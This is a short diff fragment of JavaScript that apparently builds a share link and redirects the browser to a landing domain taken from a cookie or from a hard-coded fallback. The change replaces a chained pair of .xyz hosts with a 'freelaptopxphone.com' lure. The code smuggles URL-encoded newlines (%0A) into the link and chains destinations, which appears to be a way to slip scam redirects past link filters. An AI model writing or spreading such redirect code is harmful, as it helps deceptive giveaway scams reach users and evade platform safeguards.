@@ -657,7 +657,7 @@
             if (Cookies.get('jumpurl')) {
                 landingDomain = '%0Ahttps://' + Cookies.get('jumpurl') + '/?s=1680689938';
             } else {
-                landingDomain = 'https://i4vco.xyz/%0Ahttps://task032.xyz/?s=p1680689938';
+                landingDomain = 'https://freelaptopxphone.com/';
             }
             window.location.href = share + landingDomain;
             if (width == 0) {
